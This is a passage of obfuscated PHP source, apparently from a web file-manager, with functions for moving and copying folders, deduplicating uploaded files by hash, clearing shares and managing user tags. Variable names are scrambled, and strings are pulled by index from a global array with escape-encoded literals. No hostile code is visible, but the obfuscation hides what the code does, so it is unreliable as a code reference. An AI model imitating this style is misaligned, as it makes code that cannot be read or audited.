$this->lockMoveStart($˜åƒšØ); $this->lockWriteStart($¸Øß­³¡, $×ÉşÏå‘); if (!$ûíºŠ…¶) { return $this->_moveForce($˜åƒšØ, $¸Øß­³¡, $×ÉşÏå‘); } $Å‰©‰ïë = $ûíºŠ…¶; $ıÆÄ‘ = !1; if ($ğÒ½È‘) { if ($‚ş ıÚÆ == REPEAT_RENAME_FOLDER) { $×ÉşÏå‘ = $this->fileNameAuto($¸Øß­³¡, $×ÉşÏå‘, $‚ş ıÚÆ, $ğÒ½È‘); $Å‰©‰ïë = $this->_moveForce($˜åƒšØ, $¸Øß­³¡, $×ÉşÏå‘); } else { if ($‚ş ıÚÆ == REPEAT_RENAME_FOLDER) { $‚ş ıÚÆ = REPEAT_RENAME; } $§ù×Ÿ”ú = $this->_childrenListSelect($˜åƒšØ); foreach ($§ù×Ÿ”ú as $ôìí±ÌÂ) { $this->_move($ôìí±ÌÂ[$³±Ä³Îó[402]], $ûíºŠ…¶, $‚ş ıÚÆ, $¦Á€×ë¢); } $ıÆÄ‘ = !0; } } else { if ($‚ş ıÚÆ == REPEAT_SKIP) { $ıÆÄ‘ = !0; } else { if ($‚ş ıÚÆ == REPEAT_RENAME || $‚ş ıÚÆ == REPEAT_RENAME_FOLDER) { $×ÉşÏå‘ = $this->fileNameAuto($¸Øß­³¡, $×ÉşÏå‘, $‚ş ıÚÆ, $ğÒ½È‘); $Å‰©‰ïë = $this->_moveForce($˜åƒšØ, $¸Øß­³¡, $×ÉşÏå‘); } else { if ($‚ş ıÚÆ == REPEAT_REPLACE) { $ëôëÀş¿ = $this->sourceInfoCache($ûíºŠ…¶); $´šöÉ…ˆ = $this->fileHistory($ëôëÀş¿, $¤­ª¹ß’[$³±Ä³Îó[468]], $¤­ª¹ß’[$³±Ä³Îó[76]]); $ıÆÄ‘ = !0; if ($´šöÉ…ˆ) { $¦Á€×ë¢[$³±Ä³Îó[557]][] = $¤­ª¹ß’[$³±Ä³Îó[468]]; } } } } } if ($ıÆÄ‘ && !$¦Á€×ë¢[$³±Ä³Îó[588]]) { $¦Á€×ë¢[$³±Ä³Îó[588]] = !0; } return $Å‰©‰ïë; } private function _moveForce($ÆÌ¤ÑÅÇ, $‡’şÊÁ, $Âî¿«æÖ) { $ÙîıòæÎ =& $_SERVER[şÒÁøÒÄ]; $¿ÕÓü = $this->sourceInfo($ÆÌ¤ÑÅÇ); $¹É…¹ù§ = $this->sourceInfo($‡’şÊÁ); $™şõí‡ = $¿ÕÓü[$ÙîıòæÎ[410]] == $ÙîıòæÎ[88]; $ï¤Ü¡ê = array($ÙîıòæÎ[401] => $¹É…¹ù§[$ÙîıòæÎ[402]], $ÙîıòæÎ[580] => $¹É…¹ù§[$ÙîıòæÎ[511]] . $¹É…¹ù§[$ÙîıòæÎ[402]] . $ÙîıòæÎ[50], $ÙîıòæÎ[576] => $¹É…¹ù§[$ÙîıòæÎ[411]], $ÙîıòæÎ[577] => $¹É…¹ù§[$ÙîıòæÎ[496]], $ÙîıòæÎ[579] => USER_ID, $ÙîıòæÎ[420] => $Âî¿«æÖ); $óƒ²ÙôÀ = $¿ÕÓü[$ÙîıòæÎ[411]] == SourceModel::TYPE_GROUP && $¹É…¹ù§[$ÙîıòæÎ[411]] == SourceModel::TYPE_GROUP && $¿ÕÓü[$ÙîıòæÎ[496]] == $¹É…¹ù§[$ÙîıòæÎ[496]]; if (!$óƒ²ÙôÀ && $this->moveClearAuth) { Model($ÙîıòæÎ[493])->authClear($ÆÌ¤ÑÅÇ); } $ÑÆüúó­ = $¿ÕÓü[$ÙîıòæÎ[431]] == $ÙîıòæÎ[88] && $¹É…¹ù§[$ÙîıòæÎ[431]] != $ÙîıòæÎ[88]; if ($ÑÆüúó­) { $ï¤Ü¡ê[$ÙîıòæÎ[430]] = 0; } if ($™şõí‡) { $İ¯ñ˜ºø = array($ÙîıòæÎ[580] => array($ÙîıòæÎ[540], $¿ÕÓü[$ÙîıòæÎ[511]] . $¿ÕÓü[$ÙîıòæÎ[402]] . $ÙîıòæÎ[541])); $»¼İıíê = $¿ÕÓü[$ÙîıòæÎ[511]] . $¿ÕÓü[$ÙîıòæÎ[402]] . $ÙîıòæÎ[50]; $‹ã˜ƒñµ = $¹É…¹ù§[$ÙîıòæÎ[511]] . $¹É…¹ù§[$ÙîıòæÎ[402]] . $ÙîıòæÎ[50] . $¿ÕÓü[$ÙîıòæÎ[402]] . $ÙîıòæÎ[50]; $›Á“°ªş = array($ÙîıòæÎ[580] => array($ÙîıòæÎ[589], "\162\x65\160\154\x61\x63\x65\x28\x70\x61\x72\145\156\x74\x4c\x65\166\x65\154\54\47{$»¼İıíê}\x27\54\x27{$‹ã˜ƒñµ}\47\x29"), $ÙîıòæÎ[576] => $¹É…¹ù§[$ÙîıòæÎ[411]], $ÙîıòæÎ[577] => $¹É…¹ù§[$ÙîıòæÎ[496]]); if ($ÑÆüúó­) { $›Á“°ªş[$ÙîıòæÎ[430]] = 0; } $this->where($İ¯ñ˜ºø)->data($›Á“°ªş)->save(); } $this->where(array($ÙîıòæÎ[417] => $ÆÌ¤ÑÅÇ))->data($ï¤Ü¡ê)->save(); return $ÆÌ¤ÑÅÇ; } private function clearShare($¾é°É‚, $ûáœÁìø) { $Ù¾½ç =& $_SERVER[şÒÁøÒÄ]; $çİ°ÙğÒ = $this->sourceInfo($¾é°É‚); $ïÛè½­Ú = $this->sourceInfo($ûáœÁìø); if ($çİ°ÙğÒ[$Ù¾½ç[496]] == $ïÛè½­Ú[$Ù¾½ç[496]] && $çİ°ÙğÒ[$Ù¾½ç[411]] == $Ù¾½ç[590]) { return; } $¨™ÌüÊ = array($Ù¾½ç[511] => array($Ù¾½ç[540], $çİ°ÙğÒ[$Ù¾½ç[511]] . $¾é°É‚ . $Ù¾½ç[541])); $ ÂøÛü¿ = $this->field($Ù¾½ç[417])->where($¨™ÌüÊ)->getField($Ù¾½ç[402], !0); if (!$ ÂøÛü¿) { return; } $¨™ÌüÊ = array($Ù¾½ç[402] => array($Ù¾½ç[7], $ ÂøÛü¿), $Ù¾½ç[591] => 1); $¾óŞß¾ = Model($Ù¾½ç[592])->field($Ù¾½ç[593])->where($¨™ÌüÊ)->select(); if (!$¾óŞß¾) { return; } $¾óŞß¾ = array_to_keyvalue($¾óŞß¾, $Ù¾½ç[12], $Ù¾½ç[593]); $¨™ÌüÊ = array($Ù¾½ç[593] => array($Ù¾½ç[7], $¾óŞß¾)); Model($Ù¾½ç[592])->where($¨™ÌüÊ)->save(array($Ù¾½ç[591] => 0)); Model($Ù¾½ç[594])->where($¨™ÌüÊ)->delete(); } public function copyFolderFromIO($ş¡ŸöÇ«, $‘¼€º³, $«¡Ì¶çü, $šÍæ–¡¦, $—Ã´Ÿ·û, $™‚şíÀõ = false) { $¸íÕ“™É =& $_SERVER[şÒÁøÒÄ]; $õ¦‹§àÈ = array($¸íÕ“™É[558] => array(), $¸íÕ“™É[559] => array(), $¸íÕ“™É[557] => array(), $¸íÕ“™É[595] => array()); $óÎ—¨ã¡ = $™‚şíÀõ ? $™‚şíÀõ : $ş¡ŸöÇ«->pathThis($‘¼€º³); $Î×´†úó = $this->fileNameExist($«¡Ì¶çü, $óÎ—¨ã¡); $¸Éøé€² = $this->mkdir($«¡Ì¶çü, $óÎ—¨ã¡, $šÍæ–¡¦); if (!$Î×´†úó || $šÍæ–¡¦ == REPEAT_RENAME_FOLDER) { $šÍæ–¡¦ = !1; } if ($Î×´†úó) { $this->_childrenAllMake($Î×´†úó); } Hook::trigger($¸íÕ“™É[596]); $this->_copyChildTo($ş¡ŸöÇ«, $‘¼€º³, $¸Éøé€², $šÍæ–¡¦, $õ¦‹§àÈ, $—Ã´Ÿ·û); Hook::trigger($¸íÕ“™É[597]); if ($¸Éøé€²) { $this->folderSizeResetChildren($¸Éøé€²); } $this->_childrenListClear(); Model($¸íÕ“™É[560])->addAll($õ¦‹§àÈ[$¸íÕ“™É[558]], array(), !0); Model($¸íÕ“™É[561])->eventCopy($¸Éøé€²); $this->saveAll($õ¦‹§àÈ[$¸íÕ“™É[559]]); Model($¸íÕ“™É[471])->linkAdd($õ¦‹§àÈ[$¸íÕ“™É[557]]); Model($¸íÕ“™É[471])->remove($õ¦‹§àÈ[$¸íÕ“™É[595]]); $this->folderSizeReset($«¡Ì¶çü); $this->updateModifyTime($«¡Ì¶çü); return $¸Éøé€²; } private function _copyChildTo($´ã¦ñ”Î, $Íæ³Ùâê, $·•ŠÑ€ä, $¿¿ öìç, &$èÓÇÅü‚, $›¹²ğ‡ë) { $Ê‘¡š‹ =& $_SERVER[şÒÁøÒÄ]; $’ßÃŞöÍ = $this->sourceInfoCache($·•ŠÑ€ä); $á˜àÊÏ– = $´ã¦ñ”Î->listPath($Íæ³Ùâê); $á˜àÊÏ– = $á˜àÊÏ– ? $á˜àÊÏ– : array($Ê‘¡š‹[83] => array(), $Ê‘¡š‹[82] => array()); $ø°±ı‹‰ = array_merge($á˜àÊÏ–[$Ê‘¡š‹[83]], $á˜àÊÏ–[$Ê‘¡š‹[82]]); $ĞøÛÈ‡± = $this->_addFiles($´ã¦ñ”Î, $á˜àÊÏ–[$Ê‘¡š‹[83]], $›¹²ğ‡ë); $¤Ô¿„©ƒ = array(); foreach ($ø°±ı‹‰ as &$Ñ»‡§‘„) { if (isset($ĞøÛÈ‡±[$Ñ»‡§‘„[$Ê‘¡š‹[32]]])) { $Ñ»‡§‘„ = $ĞøÛÈ‡±[$Ñ»‡§‘„[$Ê‘¡š‹[32]]]; } $Ñ»‡§‘„[$Ê‘¡š‹[410]] = $Ñ»‡§‘„[$Ê‘¡š‹[33]] == $Ê‘¡š‹[75]; $Ñ»‡§‘„[$Ê‘¡š‹[412]] = substr(_get($Ñ»‡§‘„, $Ê‘¡š‹[174], $Ê‘¡š‹[12]), 0, 10); $Ñ»‡§‘„[$Ê‘¡š‹[76]] = _get($Ñ»‡§‘„, $Ê‘¡š‹[76], 0); $Ñ»‡§‘„[$Ê‘¡š‹[468]] = _get($Ñ»‡§‘„, $Ê‘¡š‹[468], 0); if (!isset($Ñ»‡§‘„[$Ê‘¡š‹[598]]) && $Ñ»‡§‘„[$Ê‘¡š‹[468]]) { $èÓÇÅü‚[$Ê‘¡š‹[595]][] = $Ñ»‡§‘„[$Ê‘¡š‹[468]]; } if ($¿¿ öìç) { $‘èÂÛ– = $this->fileNameExistCache($·•ŠÑ€ä, $Ñ»‡§‘„[$Ê‘¡š‹[32]]); if ($‘èÂÛ–) { if ($Ñ»‡§‘„[$Ê‘¡š‹[410]] || $¿¿ öìç == REPEAT_SKIP) { continue; } if ($¿¿ öìç == REPEAT_REPLACE) { $§­•¢î¶ = $this->sourceInfoCache($‘èÂÛ–); $ğûğÁç… = $this->fileHistory($§­•¢î¶, $Ñ»‡§‘„[$Ê‘¡š‹[468]], $Ñ»‡§‘„[$Ê‘¡š‹[76]]); if ($ğûğÁç…) { $èÓÇÅü‚[$Ê‘¡š‹[557]][] = $Ñ»‡§‘„[$Ê‘¡š‹[468]]; } continue; } else { if ($¿¿ öìç == REPEAT_RENAME) { $Ñ»‡§‘„[$Ê‘¡š‹[32]] = $this->fileNameAutoCache($·•ŠÑ€ä, $Ñ»‡§‘„[$Ê‘¡š‹[32]], $¿¿ öìç, !1); } } } } if (!$Ñ»‡§‘„[$Ê‘¡š‹[410]] && $Ñ»‡§‘„[$Ê‘¡š‹[468]] == 0) { continue; } if (!$Ñ»‡§‘„[$Ê‘¡š‹[410]] && $Ñ»‡§‘„[$Ê‘¡š‹[468]]) { $èÓÇÅü‚[$Ê‘¡š‹[557]][] = $Ñ»‡§‘„[$Ê‘¡š‹[468]]; } $¤Ô¿„©ƒ[] = $this->_makeItemData($Ñ»‡§‘„, $’ßÃŞöÍ, $Ñ»‡§‘„[$Ê‘¡š‹[32]]); } unset($Ñ»‡§‘„); if (!empty($¤Ô¿„©ƒ)) { $this->addAll($¤Ô¿„©ƒ); $this->_childrenListSelect($·•ŠÑ€ä); } $Úş¦ºìÅ = $this->_childrenList($·•ŠÑ€ä); $Úş¦ºìÅ = array_to_keyvalue($Úş¦ºìÅ, $Ê‘¡š‹[32]); foreach ($ø°±ı‹‰ as $Ñ»‡§‘„) { $§­•¢î¶ = $Úş¦ºìÅ[$Ñ»‡§‘„[$Ê‘¡š‹[32]]]; $İ—çÔ¯¦ = $§­•¢î¶[$Ê‘¡š‹[402]]; $this->_copyApplyMeta($§­•¢î¶, $èÓÇÅü‚); if ($Ñ»‡§‘„[$Ê‘¡š‹[33]] == $Ê‘¡š‹[75]) { $Ñ»‡§‘„[$Ê‘¡š‹[84]] = $´ã¦ñ”Î->getPathInner($Ñ»‡§‘„[$Ê‘¡š‹[84]]); $this->_copyChildTo($´ã¦ñ”Î, $Ñ»‡§‘„[$Ê‘¡š‹[84]], $İ—çÔ¯¦, $¿¿ öìç, $èÓÇÅü‚, $›¹²ğ‡ë); } } } private function _addFiles($…ùÔ©¨, $†Œ¢æ î, $¼ùıÃ¦¶) { $¯±„™Ã¬ =& $_SERVER[şÒÁøÒÄ]; if (!$†Œ¢æ î || count($†Œ¢æ î) == 0) { return array(); } $ÚåıÀéÜ = array(); foreach ($†Œ¢æ î as &$úìÂËÒ) { Hook::trigger($¯±„™Ã¬[599], $úìÂËÒ); $úìÂËÒ[$¯±„™Ã¬[84]] = $…ùÔ©¨->getPathInner($úìÂËÒ[$¯±„™Ã¬[84]]); $•˜…Æº = $…ùÔ©¨->hashSimple($úìÂËÒ[$¯±„™Ã¬[84]]); $¢ïŸ·¿° = $…ùÔ©¨->hashMd5($úìÂËÒ[$¯±„™Ã¬[84]]); if (strlen($¢ïŸ·¿°) > 10 && !isset($ÚåıÀéÜ[$¢ïŸ·¿°])) { $ÚåıÀéÜ[$¢ïŸ·¿°] = array(); } $úìÂËÒ[$¯±„™Ã¬[177]] = $•˜…Æº; $úìÂËÒ[$¯±„™Ã¬[176]] = $¢ïŸ·¿°; $ÚåıÀéÜ[$¢ïŸ·¿°][] =& $úìÂËÒ; if (count($ÚåıÀéÜ[$¢ïŸ·¿°]) > 1) { $úìÂËÒ[$¯±„™Ã¬[598]] = !0; } Hook::trigger($¯±„™Ã¬[600], $úìÂËÒ); } unset($úìÂËÒ); $à•’ë€¬ = array($¯±„™Ã¬[176] => array($¯±„™Ã¬[7], array_keys($ÚåıÀéÜ))); $¥÷İßÌ = Model($¯±„™Ã¬[601]); $ıÕ±è×¤ = $¥÷İßÌ->where($à•’ë€¬)->select(); $ıÕ±è×¤ = $ıÕ±è×¤ ? $ıÕ±è×¤ : array(); foreach ($ıÕ±è×¤ as $èıª€¥ß) { if (!isset($ÚåıÀéÜ[$èıª€¥ß[$¯±„™Ã¬[176]]])) { continue; } $ØÃá©ä = $ÚåıÀéÜ[$èıª€¥ß[$¯±„™Ã¬[176]]]; foreach ($ØÃá©ä as &$úìÂËÒ) { $úìÂËÒ[$¯±„™Ã¬[468]] = $èıª€¥ß[$¯±„™Ã¬[468]]; $úìÂËÒ[$¯±„™Ã¬[598]] = !0; } unset($úìÂËÒ); } $íìãÙò = array(); foreach ($†Œ¢æ î as $»µ§Â÷ı) { Hook::trigger($¯±„™Ã¬[602], $»µ§Â÷ı); if (isset($»µ§Â÷ı[$¯±„™Ã¬[598]]) && $»µ§Â÷ı[$¯±„™Ã¬[598]]) { Hook::trigger($¯±„™Ã¬[603], $»µ§Â÷ı); continue; } $ÛÅìœéë = $…ùÔ©¨->getPathInner($»µ§Â÷ı[$¯±„™Ã¬[84]]); $·ùÙíüá = $¥÷İßÌ->addFileMake($ÛÅìœéë, $»µ§Â÷ı[$¯±„™Ã¬[76]], $»µ§Â÷ı[$¯±„™Ã¬[177]], $»µ§Â÷ı[$¯±„™Ã¬[176]], $»µ§Â÷ı[$¯±„™Ã¬[32]], $¼ùıÃ¦¶); Hook::trigger($¯±„™Ã¬[603], $»µ§Â÷ı); if (!is_array($·ùÙíüá)) { continue; } $íìãÙò[] = $·ùÙíüá; } $¥÷İßÌ->addAll($íìãÙò); $à•’ë€¬ = array($¯±„™Ã¬[176] => array($¯±„™Ã¬[7], array_keys($ÚåıÀéÜ))); $ıÕ±è×¤ = $¥÷İßÌ->where($à•’ë€¬)->select(); $ıÕ±è×¤ = $ıÕ±è×¤ ? $ıÕ±è×¤ : array(); foreach ($ıÕ±è×¤ as $èıª€¥ß) { if (!isset($ÚåıÀéÜ[$èıª€¥ß[$¯±„™Ã¬[176]]])) { continue; } $´Ú»ŒØ£ =& $ÚåıÀéÜ[$èıª€¥ß[$¯±„™Ã¬[176]]]; foreach ($´Ú»ŒØ£ as &$úìÂËÒ) { $úìÂËÒ[$¯±„™Ã¬[468]] = $èıª€¥ß[$¯±„™Ã¬[468]]; } unset($úìÂËÒ); } $æÃäÖƒ§ = array(); foreach ($†Œ¢æ î as $Ç¼­°©») { $æÃäÖƒ§[$Ç¼­°©»[$¯±„™Ã¬[32]]] = $Ç¼­°©»; } return $æÃäÖƒ§; } } goto A÷Ÿï¸–¡; c®×™×‰—Ø: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\137\x66\x61\166"; protected function cacheFunctionAlias($Úù±”„‰) { $±…‘øÛ =& $_SERVER[şÒÁøÒÄ]; return array($±…‘øÛ[1980] => array($±…‘øÛ[2363] . USER_ID, $±…‘øÛ[1981])); } protected function listData() { $é³ƒ•”ö =& $_SERVER[şÒÁøÒÄ]; $¥¿¸‰ûæ = array($é³ƒ•”ö[1671] => USER_ID, $é³ƒ•”ö[483] => array($é³ƒ•”ö[1984], 0)); $°èû¢Ï = $é³ƒ•”ö[2364]; $È˜üƒë— = $this->field($°èû¢Ï)->where($¥¿¸‰ûæ)->order($é³ƒ•”ö[1987])->select(); return $È˜üƒë— ? $È˜üƒë— : array(); } protected function addToTag($âí‡ºİØ, $§ôÕõÓ) { $ìçó½…í =& $_SERVER[şÒÁøÒÄ]; if (!Model($ìçó½…í[2128])->listData($§ôÕõÓ)) { return !1; } if (is_numeric($âí‡ºİØ)) { $˜Éñò­™ = Model($ìçó½…í[833])->pathInfo($âí‡ºİØ); if (!$˜Éñò­™) { return !1; } } else { $˜Éñò­™ = IO::infoSimple($âí‡ºİØ); if (!$˜Éñò­™) { return !1; } $´£óÉÌê = $˜Éñò­™[$ìçó½…í[32]]; $ÌóÄÉ¸ú = $˜Éñò­™[$ìçó½…í[33]]; if (isset($˜Éñò­™[$ìçó½…í[410]])) { $ÌóÄÉ¸ú = $˜Éñò­™[$ìçó½…í[410]] == $ìçó½…í[88] ? $ìçó½…í[75] : $ìçó½…í[200]; } } $¨ˆíıœ“ = array($ìçó½…í[1671] => USER_ID, $ìçó½…í[483] => $§ôÕõÓ, $ìçó½…í[421] => $âí‡ºİØ, $ìçó½…í[422] => $ÌóÄÉ¸ú ? $ÌóÄÉ¸ú : $ìçó½…í[416], $ìçó½…í[420] => $´£óÉÌê ? $´£óÉÌê : $ìçó½…í[12], $ìçó½…í[1873] => 0); if ($this->where($¨ˆíıœ“)->find()) { return !1; } return $this->add($¨ˆíıœ“); } protected function removeFromTag($· “Üø«, $ùû–ïµŒ) { $ï¬ş††¯ =& $_SERVER[şÒÁøÒÄ]; if (!Model($ï¬ş††¯[2128])->listData($ùû–ïµŒ)) { return !1; } if (is_array($· “Üø«)) { $· “Üø« = array($ï¬ş††¯[7], $· “Üø«); } $ÇÊ»ÜØç = array($ï¬ş††¯[1671] => USER_ID, $ï¬ş††¯[483] => $ùû–ïµŒ, $ï¬ş††¯[421] => $· “Üø«); return $this->where($ÇÊ»ÜØç)->delete(); } protected function removeByTag($ºõº”ùÂ) { $“¢”œ¨¸ =& $_SERVER[şÒÁøÒÄ]; if (!$ºõº”ùÂ) { return !1; } $á¯‡éÆº = array($“¢”œ¨¸[1671] => USER_ID, $“¢”œ¨¸[483] => $ºõº”ùÂ); return $this->where($á¯‡éÆº)->delete(); } protected function removeBySource($“á»·¼½) { $ü„¹¦Ê€ =& $_SERVER[şÒÁøÒÄ]; if (is_array($“á»·¼½)) { $“á»·¼½ = array($ü„¹¦Ê€[7], $“á»·¼½); } $¢œä­½ = array($ü„¹¦Ê€[1671] => USER_ID, $ü„¹¦Ê€[483] => array($ü„¹¦Ê€[1027], 0), $ü„¹¦Ê€[421] => $“á»·¼½); return $this->where($¢œä­½)->delete(); } }